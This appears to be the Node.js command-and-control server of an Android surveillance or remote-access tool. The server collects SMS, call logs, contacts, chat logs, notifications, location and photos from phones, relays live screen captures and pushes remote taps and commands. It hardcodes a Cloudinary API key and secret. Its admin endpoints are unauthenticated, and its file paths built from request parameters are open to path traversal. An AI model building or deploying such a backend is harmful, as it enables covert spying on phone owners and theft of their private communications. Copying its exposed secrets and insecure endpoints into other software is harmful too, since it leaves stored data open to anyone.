const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); // ✅ NEW: HTTP Server
const { Server } = require("socket.io"); // ✅ NEW: Socket.io for Realtime

const app = express();
const server = http.createServer(app); // ✅ Wrap Express in HTTP Server
const PORT = process.env.PORT || 3000;

// ✅ SOCKET.IO SETUP (Live Control Ke Liye)
const io = new Server(server, {
    cors: {
        origin: "*", // Kisi bhi website se allow karega
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8 // 100MB buffer for heavy screen data
});

// --- 1. CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage)
let devicesStatus = {}; 

// --- 3. SOCKET.IO LOGIC (🔥 LIVE SCREEN & CONTROL) ---
io.on('connection', (socket) => {
    console.log('🔌 New Connection:', socket.id);

    // 1. Join Room (Device aur Admin dono same ID se join karenge)
    socket.on('join', (roomID) => {
        socket.join(roomID);
        console.log(`🔗 Socket Joined Room: ${roomID}`);
    });

    // 2. SCREEN SHARE (Device -> Admin)
    // Phone screen ki images bhejega, hum admin ko forward karenge
    socket.on('screen-data', (data) => {
        const { room, image } = data;
        // Sirf us room me bhejo (Admin ko milega)
        socket.to(room).emit('screen-data', image);
    });

    // 3. REMOTE CONTROL (Admin -> Device)
    // Admin click/swipe karega, hum phone ko forward karenge
    socket.on('control-event', (data) => {
        const { room, action, x, y, key } = data; 
        // Action: 'click', 'swipe', 'home', 'back'
        socket.to(room).emit('control-event', { action, x, y, key });
        console.log(`🎮 Control Event to ${room}: ${action}`);
    });

    socket.on('disconnect', () => {
        console.log('❌ Disconnected:', socket.id);
    });
});

// --- 4. ROOT ROUTE ---
app.get('/', (req, res) => {
    res.send('✅ Server is Running (Socket.io Active for Live Control)!');
});

// ==================================================
//  GALLERY SYSTEM (HD PHOTOS)
// ==================================================

app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data Received" });

    const id = device_id.toString().trim().toUpperCase();
    let base64Image = image_data;
    if (!base64Image.startsWith('data:image')) base64Image = "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, 
        { folder: id, public_id: Date.now().toString(), resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" },
        function(error, result) {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;

    cloudinary.api.resources({
        type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true
    }, 
    function(error, result) {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS
// ==================================================

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// PHONE PING (Heartbeat)
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        let pendingCommand = "none";
        
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; 
        }

        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };

        res.json({ status: "success", command: pendingCommand });
    } catch (e) {
        res.status(500).json({ error: "Server Error" });
    }
});

// ADMIN COMMAND SENDER
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    devicesStatus[id].command = command;
    res.json({ status: "success", command: command });
});

// ==================================================
//  🔥 DATA STORAGE
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        } 
        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
            }
            let finalData;
            if (type === 'chat_logs') {
                finalData = [...existingData, ...newDataArray]; 
                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
            } else {
                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            }
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        } 
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

// ✅ IMPORTANT: "server.listen" instead of "app.listen" for Socket.io
server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} WITH SOCKET.IO`));

